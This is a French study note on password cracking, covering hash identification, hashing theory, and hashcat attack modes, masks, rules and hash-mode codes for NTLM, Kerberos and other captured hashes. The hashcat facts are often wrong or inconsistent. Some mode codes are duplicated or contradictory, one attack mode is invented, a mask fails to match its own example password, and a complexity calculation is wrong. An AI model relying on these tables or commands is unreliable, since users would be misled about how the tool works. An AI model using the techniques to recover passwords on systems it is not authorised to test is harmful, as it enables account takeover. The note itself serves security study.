# Password Cracking

> [!info] **C'est quoi ?**
> Cracker = retrouver le **mot de passe en clair** à partir d'un hash (offline)
> ou par **brute-force** (online). Les hash sont obtenus via les notes précédentes
> (Kerberoast, NetNTLMv2, SAM/NTDS, hashes WiFi...).

> **Outils associés :** [[Outils/Outil - hashcat|hashcat]] · [[Outils/Outil - John the Ripper|John]] · [[Outils/Outil - hydra|hydra]] · [[Outils/Outil - Medusa|Medusa]] → voir [[Tools| Bibliothèque d'Outils]]

---

## 1. Identifier le type de hash

> Fiche détaillée : [[Techniques/Password Cracking| Password Cracking (fiche)]]

L'identification correcte du hash est la **première étape critique**. Utiliser le mauvais `-m` ou le mauvais `--format` signifie des heures de calcul perdues. Plusieurs outils se complètent pour une identification fiable.

### 1.1 Outils d'identification

```bash
# hashid — le premier réflexe, détecte 200+ formats
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
hashid -j hash.txt              # sortie au format john
hashid -m hash.txt              # sortie au format hashcat
hashid -f hash.txt              # affiche uniquement les formats possibles

# Name-That-Hash — IA de classification, très fiable
[[Outils/Outil - Name-That-Hash|nth]] -t '5f4dcc3b5aa765d61d8327deb882cf99'
nth -t '$2a$10$N9qo8uLOickgx2ZMRZoMye' --accessible

# hash-identifier — classique mais utile
[[Outils/Outil - hash-identifier|hash-identifier]]
# Coller le hash → affiche les probabilités de format

# hashcat lui-même pour valider
hashcat --example-hashes | grep -B2 -A2 "NTLM"
hashcat --help | grep -E "MD5|NTLM|Kerberos|NetNTLM|bcrypt"
```

### 1.2 Guide visuel de reconnaissance par format

Le format du hash révèle souvent immédiatement son type grâce aux **préfixes** et à la **longueur** :

| Préfixe / Pattern | Format | Longueur | Exemple |
|---|---|---|---|
| `$2a$` / `$2b$` / `$2y$` | bcrypt | 60 car. | `$2a$10$N9qo8uLOickgx2ZMRZoMye` |
| `$5$` / `$6$` | SHA-256 / SHA-512 (crypt) | variable | `$6$salt$hash...` |
| `$argon2i$` / `$argon2id$` | Argon2 | variable | `$argon2i$v=19$m=65536,t=3,p=4$...` |
| `$pbkdf2$` | PBKDF2 | variable | `$pbkdf2$1000$...` |
| `$P$` / `$H$` | phpass (WordPress/phpBB) | 34 car. | `$P$B...` |
| `$krb5tgs$23$*` | Kerberoast TGS | variable | `$krb5tgs$23$*user$DOMAIN$...` |
| `$krb5asrep$23$*` | AS-REP Roast | variable | `$krb5asrep$23$*user@DOMAIN:...` |
| `$9$` | Cisco type-9 (SCrypt) | variable | `$9$jHk...` |
| `$1$` | MD5-crypt | 34 car. | `$1$salt$hash` |
| `$5$` | SHA-256-crypt | 43 car. | `$5$salt$hash` |
| `WPA*` | WPA-PMKID/PBK | variable | `WPA*1*hash*ssid*...` |
| `eyJ...` | JWT (Base64) | variable | `eyJhbGciOiJIUzI1...` |
| NetNTLMv2 (`::`) | `user::DOMAIN:challenge:...` | variable | `admin::DOMAIN:1122...:...` |
| 32 hex | MD5 / NTLM | 32 | `5f4dcc3b5aa765d61d8327deb882cf99` |
| 40 hex | SHA-1 | 40 | `aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d` |
| 64 hex | SHA-256 | 64 | `e3b0c44298fc1c149afbf4c8996fb924...` |
| 128 hex | SHA-512 | 128 | `cf83e1357eefb8bdf1542850d66d8007...` |

### 1.3 Regex de détection rapide

```python
import re

def detect_hash(h):
    patterns = {
        'MD5':         r'^[a-f0-9]{32}$',
        'SHA-1':       r'^[a-f0-9]{40}$',
        'SHA-256':     r'^[a-f0-9]{64}$',
        'SHA-512':     r'^[a-f0-9]{128}$',
        'NTLM':        r'^[a-f0-9]{32}$',
        'bcrypt':      r'^\$2[aby]?\$\d{2}\$[./A-Za-z0-9]{53}$',
        'MD5-crypt':   r'^\$1\$[./A-Za-z0-9]{1,8}\$[./A-Za-z0-9]{22}$',
        'SHA-256-crypt': r'^\$5\$[./A-Za-z0-9]{1,16}\$[./A-Za-z0-9]{43}$',
        'SHA-512-crypt': r'^\$6\$[./A-Za-z0-9]{1,16}\$[./A-Za-z0-9]{86}$',
        'Kerberoast':  r'^\$krb5tgs\$',
        'AS-REP':      r'^\$krb5asrep\$',
        'JWT':         r'^eyJ[A-Za-z0-9_-]+\.eyJ',
        'WPA':         r'^WPA\*',
        'NetNTLMv2':   r'^[^:]+::[^:]+:[a-f0-9]{16}:',
    }
    for name, pat in patterns.items():
        if re.match(pat, h.strip()):
            return name
    return 'UNKNOWN'

# Usage
print(detect_hash('5f4dcc3b5aa765d61d8327deb882cf99'))  # MD5
print(detect_hash('$2a$10$N9qo8uLOickgx2ZMRZoMye'))     # bcrypt
```

### 1.4 Tableau des hash types les plus courants

| Hash | Format | hashcat `-m` | john `--format` | Difficulté |
|---|---|---|---|---|
| MD5 | 32 hex | `0` | `raw-md5` | Très rapide |
| SHA-1 | 40 hex | `100` | `raw-sha1` | Rapide |
| SHA-256 | 64 hex | `1400` | `raw-sha256` | Rapide |
| SHA-512 | 128 hex | `1700` | `raw-sha512` | Moyen |
| bcrypt | `$2a$...` | `3200` | `bcrypt` | Lent |
| NTLM | 32 hex | `1000` | `nt` | Très rapide |
| LM | 32 hex | `3000` | `lm` | Très rapide |
| NetNTLMv1 | `user::dom:...` | `5500` | `netntlm` | Rapide |
| NetNTLMv2 | `user::domain:...` | `5600` | `netntlmv2` | Rapide |
| Kerberoast (TGS) | `$krb5tgs$23$*...` | `13100` | `krb5tgs` | Moyen-lent |
| AS-REP (TGT) | `$krb5asrep$23$*...` | `18200` | `krb5asrep` | Moyen-lent |
| WPA/WPA2 PMKID | `WPA*...` | `22000` | `wpapcap` | Lent |
| WPA2 (hcxpcapngtool) | `hcxpcapngtool` | `22000` | — | Lent |
| JWT | `eyJ...` | `16500` | — | Variable |
| WordPress (phpass) | `$P$...` | `400` | `phpass` | Moyen |
| Django | `pbkdf2_sha256$...` | `10000` | — | Lent |
| Drupal 7 | `$S$D...` | `7900` | `drupal7` | Lent |
| ZIP | `$zip2$...` | `17200` | `zip` | Variable |
| RAR5 | `$rar5$...` | `13000` | `rar` | Lent |
| KeePass | `$keepass$*...` | `13400` | `keepass` | Moyen |
| Cisco `$9$` (type-9) | `$9$...` | `9300` | — | Lent |
| Cisco `$8$` (type-8) | `$8$...` | `9200` | — | Lent |
| SHA-1 (Unix) | `$4$...` | `27100` | — | Lent |
| Argon2 | `$argon2...` | varies | — | Très lent |
| PBKDF2-HMAC-SHA256 | `$pbkdf2...` | varies | — | Lent |
| Linux shadow (DES) | 13 car. | `1500` | `descrypt` | Rapide |
| Linux shadow (MD5) | `$1$...` | `500` | `md5crypt` | Rapide |
| Linux shadow (SHA-256) | `$5$...` | `7400` | `sha256crypt` | Moyen |
| Linux shadow (SHA-512) | `$6$...` | `1800` | `sha512crypt` | Moyen |
| MSSQL 2005 | `0x0100...` | `131` | `mssql05` | Moyen |
| MySQL 4.1+ | `*AABB...` | `300` | `mysql-sha1` | Rapide |
| Oracle 11g | `S:...` | `112` | `oracle11` | Rapide |
| Cisco IOS MD5 | `$1$...` | `500` | `md5crypt` | Rapide |

---

## 2. Théorie des hash

> Voir aussi [[11 - Glossaire|Glossaire]] pour les termes clés

### 2.1 Comment fonctionne le hashing

Un **hash cryptographique** transforme une entrée de taille variable en une sortie de taille fixe, de manière **déterministe** mais **irréversible**. On ne peut pas « déhasher » — on peut seulement **essayer toutes les combinaisons** jusqu'à trouver une collision.

```mermaid
flowchart LR
    A["Mot de passe en clair"] --> B["Fonction de hash"]
    B --> C["Hash (sortie fixe)"]
    D["Salt (sel aléatoire)"] --> B
    B --> E["Hash salé"]
    style A fill:#4CAF50,color:#fff
    style C fill:#2196F3,color:#fff
    style D fill:#FF9800,color:#fff
    style E fill:#9C27B0,color:#fff
```

### 2.2 Le salting (sel)

Le **salt** est une chaîne aléatoire ajoutée au mot de passe avant le hashing. Son but : rendre les **rainbow tables** inutiles car deux utilisateurs avec le même mot de passe auront des hash différents.

```
hash = SHA256(salt + password)
```

| Type de salt | Description | Où on le trouve |
|---|---|---|
| Par utilisateur | Salt unique stocké avec le hash | `/etc/shadow`, base Active Directory |
| Global (par défaut) | Un seul salt pour tout le système | Mauvaise pratique historique |
| Pepper | Clé secrète ajoutée au hash (côté application) | Config serveur, pas dans la DB |
| Aucun | Hash nu sans sel | Mauvaise pratique, vulnérable aux rainbow tables |

> [!tip] En pratique, la plupart des systèmes modernes utilisent un salt par utilisateur. C'est pourquoi deux comptes AD avec le même mot de passe ont des hash NTLM identiques — **NTLM n'utilise pas de salt**.

### 2.3 Key Stretching : PBKDF2, scrypt, Argon2

Les algorithmes modernes ajoutent des **itérations** volontairement coûteuses pour ralentir le cracking :

| Algorithme | Paramètre clé | Hashcat `-m` | Vitesse typique (GPU) | Année |
|---|---|---|---|---|
| PBKDF2-HMAC-SHA1 | Itérations (1000-100000) | `12000` | ~300k H/s | 2000 |
| PBKDF2-HMAC-SHA256 | Itérations | `10900` | ~200k H/s | 2000 |
| scrypt | N, r, p | `8900` | ~50k H/s | 2009 |
| Argon2d | Mémoire, itérations, parallélisme | `varies` | ~1k H/s | 2015 |
| Argon2id | Mémoire, itérations, parallélisme | `varies` | ~1k H/s | 2015 |
| bcrypt | Cost factor (2^cost) | `3200` | ~15k H/s | 1999 |

```bash
# Exemple : argon2 dans hashcat
# Format : $argon2i$v=19$m=65536,t=3,p=4$salt$hash
hashcat -m 19500 hash.txt rockyou.txt

# Exemple : bcrypt (cost 10 = 2^10 = 1024 itérations)
hashcat -m 3200 hash.txt rockyou.txt
# Un seul bcrypt cost=10 est ~1000x plus lent que MD5
```

> [!warning] **Impact sur le cracking** : avec PBKDF2 à 100 000 itérations, une attaque MD5 à 100 milliards H/s devient 100 000x plus lente. Argon2 avec 256 MB de mémoire est encore plus coûteux à paralléliser sur GPU.

### 2.4 Rainbow Tables

Les rainbow tables sont des **tables pré-calculées** de millions de hash pour des combinaisons courantes. Elles permettent de « cracker » un hash en quelques secondes en le cherchant dans la table.

```mermaid
flowchart TD
    A["Hash à cracker"] --> B{Le hash est dans la rainbow table ?}
    B -->|Oui| C["Mot de passe retrouvé instantanément"]
    B -->|Non| D["Échec → il faut brute-forcer"]
    E["Création de la rainbow table"] --> F["Pré-calcul de milliards de hash"]
    F --> G["Stockage optimisé (chaînes de réduction)"]
    style C fill:#4CAF50,color:#fff
    style D fill:#f44336,color:#fff
```

**Contre-mesures contre les rainbow tables :**
- **Salt** : rend la table spécifique au salt → inutile pour d'autres comptes
- **Pepper** : clé secrète inconnue du serveur web → rainbow table impossible
- **Argon2/bcrypt** : coûteux à calculer → la création de la table est elle-même trop lente
- Outil : [[Outils/Outil - hashcat|hashcat]] n'utilise pas les rainbow tables, il brute-force

### 2.5 Birthday Paradox & Attaques par collision

Le **paradoxe des anniversaires** dit que pour une fonction de hash à N bits, on trouve une collision avec ~2^(N/2) essais, pas 2^N.

```
MD5   : 128 bits → 2^64 ≈ 18 quintillions de tests pour collision
SHA-1 : 160 bits → 2^80 ≈ 1.2 nonillions
SHA-256 : 256 bits → 2^128 → practically impossible
```

| Algorithme | Taille (bits) | Collision理论ique | Collision pratique | Statut |
|---|---|---|---|---|
| MD5 | 128 | 2^64 | Oui (2004, Wang et al.) | Cassé |
| SHA-1 | 160 | 2^80 | Oui (2017, SHAttered) | Cassé |
| SHA-256 | 256 | 2^128 | Non | Sûr |
| SHA-3 | 256 | 2^128 | Non | Sûr |

> [!info] Pour le password cracking, on ne cherche pas de collision — on cherche le **pré-image originale** (le mot de passe). La complexité pré-image reste 2^N pour MD5 et SHA-1, même si les collisions sont trouvables.

### 2.6 Tableau récapitulatif : force de résistance

| Type d'attaque | MD5 | SHA-1 | SHA-256 | bcrypt (cost 10) | Argon2 (256MB) |
|---|---|---|---|---|---|
| Rainbow table | Possible | Possible | Difficile | Impossible | Impossible |
| Brute-force GPU (md5 hash/s) | 100G+ | 20G+ | 5G+ | 15k | ~1k |
| Collision | Pratique | Pratique | Impossible | N/A | N/A |
| Salting protection | Nécessaire | Nécessaire | Nécessaire | Intégré | Intégré |

---

## 3. Hashcat — Modes d'attaque

> Fiche outil complète : [[Outils/Outil - hashcat|hashcat]]

[[Outils/Outil - hashcat|hashcat]] supporte **10 modes d'attaque** principaux ( `-a 0` à `-a 9`). Chaque mode a un cas d'usage précis et une syntaxe différente.

### 3.1 Référence complète des modes

| Mode | `-a` | Nom | Principe | Cas d'usage typique |
|---|---|---|---|---|
| Dictionary | `0` | Straight | Essaie chaque ligne d'une wordlist | Premier essai, leaks |
| Combinator | `1` | Combination | Concatène 2 wordlists (mot1+mot2) | Mots composés (`admin2024`) |
| Brute-force | `3` | Mask | Génère toutes les combinaisons d'un motif | Mot de passe partiellement connu |
| Hybrid Wordlist+Mask | `6` | Hybrid Wordlist+Mask | Wordlist à gauche, mask à droite | `motdebase` + `123` |
| Hybrid Mask+Wordlist | `7` | Hybrid Mask+Wordlist | Mask à gauche, wordlist à droite | `!` + `motdebase` |
| Prince | `8` | PRINCE | Génère des combinaisons intelligentes | Exploration combinatoire |
| Association | `9` | Toggle-Case | Wordlist + toggle case + rules | Dictionnaire amélioré |
| Sybil-Attack | — | Multi-device | Répartition sur plusieurs GPU | Performance maximale |
| Skip | `—` | Skip | Sauter les premiers candidats | Reprise après interruption |

### 3.2 Mode 0 : Dictionary (Straight)

Le mode le plus simple et souvent le plus efficace en premier essai.

```bash
# Basique
hashcat -m 1000 -a 0 hash.txt rockyou.txt

# Avec potfile (reprendre là où on s'est arrêté)
hashcat -m 1000 -a 0 hash.txt rockyou.txt --show

# Avec plusieurs wordlists
hashcat -m 1000 -a 0 hash.txt wordlist1.txt wordlist2.txt wordlist3.txt

# Avec suppression des hash trouvés
hashcat -m 1000 -a 0 hash.txt rockyou.txt --remove -o found.txt
```

### 3.3 Mode 1 : Combinator

Concatène chaque mot de la première liste avec chaque mot de la deuxième.

```bash
# Concaténation simple
hashcat -m 1000 -a 1 hash.txt wordlist1.txt wordlist2.txt

# Exemple concret : prénoms + nombres
# wordlist1.txt : alice, bob, charlie
# wordlist2.txt : 123, 2024, !!
# → alice123, alice2024, alice!!, bob123, ...
```

> [!warning] Le mode combinator génère `len(list1) × len(list2)` candidats. Avec deux listes de 100 000 mots, ça fait **10 milliards** de tests — soyez ciblé.

### 3.4 Mode 3 : Mask (Brute-force)

Génère tous les candidats correspondant à un **motif** avec des charsets définis.

```bash
# 8 caractères : majuscule + 3 minuscules + 4 chiffres
hashcat -m 1000 -a 3 hash.txt '?u?l?l?l?l?l?d?d?d?d'

# 6 minuscules + 3 chiffres
hashcat -m 1000 -a 3 hash.txt '?l?l?l?l?l?l?d?d?d'

# Tout ASCII, 4 à 6 caractères
hashcat -m 1000 -a 3 -i hash.txt '?a?a?a?a' --increment --increment-min 4 --increment-max 6
```

### 3.5 Mode 6 & 7 : Hybrid

Combine une wordlist existante avec un mask.

```bash
# Mode 6 : wordlist à gauche + mask à droite
# → motdebase + 123, motdebase + !!!, etc.
hashcat -m 1000 -a 6 hash.txt rockyou.txt '?d?d?d'

# Mode 7 : mask à gauche + wordlist à droite
# → !123motdebase, $$motdebase, etc.
hashcat -m 1000 -a 7 hash.txt rockyou.txt '?s?d?d'
```

### 3.6 Mode 8 : PRINCE

PRINCE (PRobability INfinite Chained Elements) génère des mots en combinant les caractères des wordlists de manière intelligente.

```bash
# Basique
hashcat -m 1000 -a 8 hash.txt rockyou.txt

# Limiter la longueur
hashcat -m 1000 -a 8 hash.txt rockyou.txt --pw-min=8 --pw-max=12

# Avec une seed wordlist (mélange les caractères)
hashcat -m 1000 -a 8 hash.txt rockyou.txt --elem-cnt-min=2 --elem-cnt-max=4
```

### 3.7 Mode 9 : Association (Toggle)

Applique le toggle case + des règles sur la wordlist.

```bash
hashcat -m 1000 -a 9 hash.txt rockyou.txt -r toggle.rule
# Génère : password, PASSWORD, Password, pAssword...
```

### 3.8 Flux de décision : quel mode choisir ?

```mermaid
flowchart TD
    A["Nouveau hash à cracker"] --> B{"Tu as un hash connu dans une DB leak ?"}
    B -->|Oui| C["Dict straight (-a 0)"]
    B -->|Non| D{"Le mdp a une structure connue ?"}
    D -->|Oui| E["Mask (-a 3)"]
    D -->|Non| F{"Le mdp contient un mot de base ?"}
    F -->|Oui| G["Dict + Règles (-a 0 -r)"]
    F -->|Non| H{"Tu veux combiner 2 lists ?"}
    H -->|Oui| I["Combinator (-a 1)"]
    H -->|Non| J["Hybrid (-a 6/7) ou PRINCE (-a 8)"]
    style C fill:#4CAF50,color:#fff
    style E fill:#2196F3,color:#fff
    style G fill:#FF9800,color:#fff
    style I fill:#9C27B0,color:#fff
    style J fill:#00BCD4,color:#fff
```

---

## 4. Hashcat — Masques & Charsets

### 4.1 Charsets prédéfinis

| Charset | Symbole | Description | Taille |
|---|---|---|---|
| Lowercase | `?l` | `a-z` | 26 |
| Uppercase | `?u` | `A-Z` | 26 |
| Digits | `?d` | `0-9` | 10 |
| Symbols | `?s` | ` !"#$%&'()*+,-./:;<=>?@[\]^_``{|}~` | 32 |
| All ASCII | `?a` | Tout les ci-dessus combinés | 94 |
| Hex lower | `?h` | `0-9a-f` | 16 |
| Hex upper | `?H` | `0-9A-F` | 16 |
| Binary | `?b` | `0x00-0xff` | 256 |

### 4.2 Custom charsets (-1, -2, -3, -4)

On peut définir **4 charsets personnalisés** avec `-1` à `-4`, puis les référencer avec `?1` à `?4`.

```bash
# -1 = lettres minuscules + chiffres
hashcat -m 1000 -a 3 -1 '?l?d' hash.txt '?1?1?1?1?1?1?1?1'

# -1 = caractères de ponctuation courants
hashcat -m 1000 -a 3 -1 '!?@#$' hash.txt '?u?l?l?l?l?1?d?d'

# -1 = charset de langue spécifique (français)
hashcat -m 1000 -a 3 -1 'àâéèêëïîôùûüÿçæ' hash.txt '?1?1?1?1?1?d?d?d'

# Combinaison de charsets custom
hashcat -m 1000 -a 3 -1 '?l?d' -2 '?u?d' -3 '!@#$' hash.txt '?1?2?3?3?d?d?d?d'
```

### 4.3 Stratégies de mask generation

La clé est de **construire le bon mask** selon les informations dont on dispose :

```bash
# Stratégie 1 : Mot de passe « Summer2024 »
# Pattern : Maj + 5 min + 4 chiffres
hashcat -m 1000 -a 3 hash.txt '?u?l?l?l?l?l?d?d?d?d'

# Stratégie 2 : Mot de passe « Passw0rd! »
# Pattern : Maj + 4 min + chiffre + 3 min + symbole
hashcat -m 1000 -a 3 hash.txt '?u?l?l?l?l?l?d?l?l?l?s'

# Stratégie 3 : Incrémental (longueur inconnue)
hashcat -m 1000 -a 3 -i hash.txt '?l?l?l?l?l?l?l?l' \
  --increment-min 6 --increment-max 8

# Stratégie 4 : Mascara (un seul caractère connu)
# ex: on sait que le 3e caractère est 'a'
# On crée le mask avec ?l?l?a?l?l?l
hashcat -m 1000 -a 3 hash.txt '?l?l?a?l?l?l?l?l?l?l'
```

### 4.4 Hybrid attack — deep dive

L'attaque hybride est particulièrement puissante quand on a une **intuition partielle** du mot de passe.

```bash
# On suspecte que le mdp est « entreprise » + chiffres
# Mode 6 : wordlist + mask
hashcat -m 1000 -a 6 hash.txt /usr/share/wordlists/company.txt '?d?d?d?d'
# → entreprise1999, entreprise2024, ...

# On suspecte « ! » ou « $$ » devant un mot classique
# Mode 7 : mask + wordlist
hashcat -m 1000 -a 7 hash.txt rockyou.txt '?s?s'
# → !password, $$admin, #1secret, ...

# Profondeur augmentée avec règles + hybride
hashcat -m 1000 -a 6 hash.txt rockyou.txt '?d?d?d' -r best64.rule
```

### 4.5 Calcul de la complexité d'un mask

```python
def mask_complexity(mask):
    charset_sizes = {
        '?l': 26, '?u': 26, '?d': 10, '?s': 32,
        '?a': 94, '?h': 16, '?H': 16, '?b': 256
    }
    total = 1
    i = 0
    while i < len(mask):
        if mask[i] == '?' and i + 1 < len(mask):
            total *= charset_sizes.get(mask[i+1], 1)
            i += 2
        else:
            i += 1
    return total

# Exemples
print(f"8 lowercase : {mask_complexity('?l?l?l?l?l?l?l?l'):,.0f}")
# → 208,827,064,576 (208 milliards)
print(f"Maj+5min+4digits : {mask_complexity('?u?l?l?l?l?l?d?d?d?d'):,.0f}")
# → 26 × 26^5 × 10^4 = 3,089,157,760 (3 milliards)
print(f"8 all ascii : {mask_complexity('?a?a?a?a?a?a?a?a'):,.0f}")
# → 6,095,689,385,410,816 (6 quadrillions)
```

---

## 5. Hashcat — Règles

> Voir aussi [[Outils/Outil - OneRuleToRuleThemAll|OneRuleToRuleThemAll]] pour la mega-règle

Les **règles** transforment les mots de la wordlist pour générer des variantes. C'est souvent ce qui fait la différence entre un échec et un succès.

### 5.1 Syntaxe des règles hashcat

Chaque ligne du fichier de règles est une séquence d'opérations :

| Opération | Syntaxe | Description | Exemple (`password` →) |
|---|---|---|---|
| Append | `$X` | Ajoute X à la fin | `$1` → `password1` |
| Prepend | `^X` | Ajoute X au début | `^1` → `1password` |
| Capitalize | `c` | Majuscule 1ère lettre | `Password` |
| Lowercase | `l` | Minuscule tout | `PASSWORD` → `password` |
| Uppercase | `u` | Majuscule tout | `password` → `PASSWORD` |
| Toggle case | `t` | Inverse la casse | `Password` → `pASSWORD` |
| Toggle N | `TN` | Toggle la lettre à la position N | `T0` : `Password` → `password` |
| Replace | `sXY` | Remplace toutes les X par Y | `sa@` : `password` → `p@ssword` |
| Purge | `@X` | Supprime toutes les occurrences de X | `@s` : `password` → `paword` |
| Duplicate | `p` | Duplique le mot entier | `password` → `passwordpassword` |
| Reflection | `r` | Refle le mot | `password` → `drowssap` |
| Rotate left | `{` | Décale tout à gauche | `password` → `asswordp` |
| Rotate right | `}` | Décale tout à droite | `password` → `dpasswor` |
| Truncate | `[` | Supprime le dernier char | `password` → `passwor` |
| Truncate at N | `[N` | Tronque à la position N | `[3` : `password` → `pas` |
| Insert X at N | `iNX` | Insère X à la position N | `i4!` : `password` → `pass!word` |
| Overwrite X at N | `oNX` | Écrase X à la position N | `o0X` : `password` → `Xassword` |
| Replace from ruleset | `X` | Character replacement rules | Complex |

### 5.2 Fichiers de règles prédéfinis

| Fichier | Nb règles | Stratégie | Quand l'utiliser |
|---|---|---|---|
| `best64.rule` | 64 | Top mutations les plus efficaces | Premier essai rapide |
| `d3ad0ne.rule` | 28 000+ | Très complet | Cracking sérieux |
| `rockyou-30000.rule` | 30 000 | Basé sur les patterns de rockyou | Avec rockyou.txt |
| `T0XlC.rule` | 43 000+ | Exhaustif | Dernier recours offline |
| `OneRuleToRuleThemAll` | 100 000+ | Mega-règle | La meilleure pour hashcat |
| `dive.rule` | 99 000+ | Complément à T0XlC | Très complet |
| `InsidePro-HashManager.rule` | 65 000+ | Professionnel | Entreprise |

```bash
# Utilisation
hashcat -m 1000 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Plusieurs fichiers de règles
hashcat -m 1000 -a 0 hash.txt rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  -r /usr/share/hashcat/rules/d3ad0ne.rule

# OneRuleToRuleThemAll (à télécharger)
hashcat -m 1000 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule
```

### 5.3 Créer des règles custom

```bash
# Fichier : custom.rule
# Basé sur des patterns de mots de passe entreprise
c                   # Capitalize → Password
sa@                 # a → @
se3                 # e → 3
so0                 # o → 0
si1                 # i → 1
$1                  # Append 1
$!                  # Append !
$2024               # Append 2024
c sa@ $1            # Capitalize + a→@ + append 1
c se3 $!            # Capitalize + e→! + append !
c so0 sa@ $1        # Capitalize + o→0 + a→@ + append 1
c $2024             # Password2024
c $!2024            # Password!2024
c $2024!            # Password2024!

# Utilisation
hashcat -m 1000 -a 0 hash.txt custom_wordlist.txt -r custom.rule
```

### 5.4 Générateurs de règles automatiques

```bash
# hashcat-utils : générer des règles depuis un pattern
# Exemple : générer des règles pour « Maj + 5 min + 4 chiffres »
hashcat-utils/rulegen.rule

# Princeprocessor : générer des candidats PRINCE
pp64.bin < rockyou.txt | hashcat -m 1000 -a 0 hash.txt

# Mentalist : interface graphique pour construire des arbres de règles
# Voir [[Outils/Outil - Mentalist|Mentalist]]
```

---

## 6. Hashcat — Formats de hash

> Fiche complète : [[Outils/Outil - hashcat|hashcat]] · Référence officielle : `hashcat --example-hashes`

### 6.1 Tableau de référence complète (-m codes)

#### Hashs basiques

| `-m` | Nom | Catégorie | Hashcat Mode |
|---|---|---|---|
| `0` | MD5 | Hash courant | Straight |
| `100` | SHA-1 | Hash courant | Straight |
| `400` | phpass (WordPress) | Hash web | Straight |
| `900` | MD4 | Hash courant | Straight |
| `1000` | NTLM | Windows AD | Straight |
| `1300` | SHA-224 | Hash courant | Straight |
| `1400` | SHA-256 | Hash courant | Straight |
| `1700` | SHA-512 | Hash courant | Straight |
| `17300` | SHA3-256 | Hash courant | Straight |
| `17600` | SHA3-512 | Hash courant | Straight |

#### Hashs Windows

| `-m` | Nom | Catégorie | Hashcat Mode |
|---|---|---|---|
| `3000` | LM | Windows legacy | Straight |
| `1000` | NTLM | Windows AD | Straight |
| `2100` | DCC1 (Domain Cached Creds v1) | Windows cached | Straight |
| `1100` | Domain Cached Creds (DCC2, MS Cache) | Windows cached | Straight |
| `7500` | Kerberos 5, etype 23, AS-REQ Pre-Auth | Kerberos | Straight |
| `13100` | Kerberos 5, etype 23, TGS | Kerberoast | Straight |
| `18200` | Kerberos 5, etype 23, AS-REP | AS-REP Roast | Straight |
| `19600` | Kerberos 5, etype 17, TGS | Kerberos | Straight |
| `19700` | Kerberos 5, etype 18, TGS | Kerberos | Straight |
| `19800` | Kerberos 5, etype 17, AS-REP | Kerberos | Straight |
| `19900` | Kerberos 5, etype 18, AS-REP | Kerberos | Straight |

#### Hashs Linux/Unix

| `-m` | Nom | Catégorie | Hashcat Mode |
|---|---|---|---|
| `500` | md5crypt ($1$) | Linux shadow | Straight |
| `7400` | sha256crypt ($5$) | Linux shadow | Straight |
| `1800` | sha512crypt ($6$) | Linux shadow | Straight |
| `1500` | descrypt ($1$, traditional) | Linux legacy | Straight |
| `7401` | Bitcoin/Litecoin wallet.dat | Crypto wallet | Straight |

#### Hashs Web / Applications

| `-m` | Nom | Catégorie | Hashcat Mode |
|---|---|---|---|
| `400` | phpass (WordPress, phpBB) | CMS | Straight |
| `2611` | vBulletin < 3.8.5 | CMS | Straight |
| `27100` | Drupal 7 | CMS | Straight |
| `121` | SMF (Simple Machines Forum) > v1.1 | CMS | Straight |
| `11` | Joomla < 2.5.18 | CMS | Straight |
| `21` | Joomla > 2.5.18 | CMS | Straight |
| `10000` | Django (PBKDF2-SHA256) | Framework | Straight |
| `124` | Django (SHA1) | Framework | Straight |
| `10000` | Django (PBKDF2-SHA256) | Framework | Straight |
| `16500` | JWT (JSON Web Token) | Token | Straight |

#### Hashs de fichiers

| `-m` | Nom | Catégorie | Hashcat Mode |
|---|---|---|---|
| `17200` | PKZIP (compressed) | Archive | Straight |
| `17210` | PKZIP (uncompressed) | Archive | Straight |
| `17220` | PKZIP (mixed) | Archive | Straight |
| `17225` | PKZIP (zipbomb) | Archive | Straight |
| `17230` | PKZIP (different password) | Archive | Straight |
| `23001` | SecureZIP AES-128 | Archive | Straight |
| `23002` | SecureZIP AES-192 | Archive | Straight |
| `23003` | SecureZIP AES-256 | Archive | Straight |
| `12500` | RAR3-hp | Archive | Straight |
| `13000` | RAR5 | Archive | Straight |
| `23001` | 7-Zip | Archive | Straight |
| `11600` | 7-Zip | Archive | Straight |
| `10500` | PDF 1.4-1.6 | Document | Straight |
| `10600` | PDF 1.7 Level 3 | Document | Straight |
| `10700` | PDF 1.7 Level 8 | Document | Straight |
| `9400` | MS Office 2007 | Document | Straight |
| `9500` | MS Office 2010 | Document | Straight |
| `9600` | MS Office 2013 | Document | Straight |
| `10400` | PDF 1.1-1.3 | Document | Straight |

#### Hashs Base / DB

| `-m` | Nom | Catégorie | Hashcat Mode |
|---|---|---|---|
| `300` | MySQL 4.1+ | DB | Straight |
| `301` | MySQL (AES) | DB | Straight |
| `12` | PostgreSQL | DB | Straight |
| `8000` | Sybase ASE | DB | Straight |
| `12300` | Oracle T: Type (Modern) | DB | Straight |
| `112` | Oracle 11g | DB | Straight |
| `12300` | Oracle 12c | DB | Straight |
| `8500` | Redis (SHA-1) | DB | Straight |

#### Hashs Réseau

| `-m` | Nom | Catégorie | Hashcat Mode |
|---|---|---|---|
| `5500` | NetNTLMv1 / NetNTLMv1+ESS | Network | Straight |
| `5600` | NetNTLMv2 | Network | Straight |
| `5500` | NTLMv1 | Network | Straight |
| `22000` | WPA-PBKDF2-PMKID+EAPOL | WiFi | Straight |

#### Hashs Certificats / Clés

| `-m` | Nom | Catégorie | Hashcat Mode |
|---|---|---|---|
| `22` | SSH (RSA/DSA/ECDSA) | Key | Straight |
| `23` | SSH (ED25519) | Key | Straight |
| `15500` | JKS (Java Key Store) | Key | Straight |
| `13400` | KeePass 1/2 | Password Manager | Straight |
| `23400` | Bitwarden | Password Manager | Straight |
| `16200` | HMAC-SHA1 | HMAC | Straight |

#### Hashs Network Equipment

| `-m` | Nom | Catégorie | Hashcat Mode |
|---|---|---|---|
| `501` | Cisco-IOS MD5 | Network device | Straight |
| `9300` | Cisco-Type-9 | Network device | Straight |
| `9200` | Cisco-Type-8 | Network device | Straight |
| `2410` | Cisco-Type-7 | Network device | Straight |
| `8500` | Huawei (sha256) | Network device | Straight |

### 6.2 Trouver le bon -m

```bash
# Lister tous les example hashes pour un mot de passe connu
hashcat --example-hashes | grep -B5 -A1 'hashcat'

# Chercher un mot spécifique
hashcat --example-hashes | grep -B2 -A2 "5f4dcc3b5aa765d61d8327deb882cf99"

# Lister tous les formats supportés
hashcat --help | head -100
```

---

## 7. Hashcat — Performance & GPU

### 7.1 GPU Selection & Configuration

```bash
# Lister les devices disponibles
hashcat -I
